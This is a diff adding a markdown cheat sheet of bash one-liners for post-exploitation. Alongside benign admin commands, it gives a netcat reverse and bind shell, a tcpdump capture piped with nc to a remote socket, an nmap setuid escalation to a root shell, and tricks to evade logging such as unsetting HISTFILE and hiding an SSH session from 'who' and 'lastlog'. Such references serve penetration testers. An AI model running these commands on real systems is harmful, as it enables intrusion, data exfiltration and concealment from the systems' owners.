@@ -1,0 +1,113 @@
+# Bash Commands for Post Exploitation
+
+One liners
+-----------
+
+**Resolve a list of hostnames to IP addresses**
+```bash
+awk < hostnames.txt '{ system("resolveip -s " $1) }'
+```
+
+**IIS 6.0 IP Disclosure**
+```bash
+curl -l -O -H "Host:" "example.com"
+```
+
+**Connect to SSL websites**
+```bash
+openssl s_client -connect example.com:443
+```
+
+**Convert base64 to text**
+```bash
+echo 'base64string' | base64 -d   (Use -D on OSX)
+```
+
+**Decode ASCII shellcode**
+```bash
+echo -e *shellcode hex string*   (may need to use -i to ignore bad chars)
+```
+
+**Enumerate DNS of Class C**
+```bash
+for ip in $(seq 1 254); do; host 10.1.1.$ip | grep "name pointer"; done
+```
+
+**SSH to box and hide from "who" and "lastlog"**
+```bash
+ssh andrew@10.1.1.1 -T /bin/bash
+```
+
+**Prevent terminal logging**
+```bash
+unset HISTFILE
+```
+
+**Add immutable attribute to a unix file**
+```bash
+chattr +i *file*
+```
+
+**SSH into host2 through host1**
+```bash
+ssh -o "proxycommand ssh -W host2 host1" host2
+```
+
+**Nmap setuid privesc**
+```bash
+nmap --script <(echo 'os.execute("/bin/sh")')
+nmap --interactive     (for older versions)
+```
+
+**Transfer files through SSH**
+```bash
+ssh test@10.1.1.1 "cat test.tar.gz" > test.tar.gz
+```
+
+**Internal port redirect for bypassing services**
+```bash 
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 4444
+```
+
+**Enable forwarding on the fly**
+```bash
+sysctl -w net.ipv4.ip_forward=1
+```
+
+**Kill with USR1 developer defined signal**
+```bash
+kill -USR1 <pid>
+```
+
+**Pull IP addresses from a file**
+```bash
+grep -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
+```
+
+**Sniff traffic with tcpdump and send to remote tcp socket**
+```bash
+tcpdump -w - | nc -v 8.8.8.8 9999
+```
+
+**Recursively search for text contained in files within a directory**
+```bash
+zcat -rf ./* | grep "searchstring"
+```
+
+**Recursively search for files with the specified word within them**
+*Submitted by cat on Google Fourms*
+```bash
+ls -a | find | grep -i "string"
+```
+
+**Netcat backdoor**
+```bash
+nc -e /bin/bash *remotecomputer* *port*
+OR
+nc -e /bin/bash -lp *port*
+```
+
+Credits
+-----------
+Credits to @TheAndrewBalls for posting some awsome one liners (the hidden SSH example and the DNS enumeration are both his contributions)
+
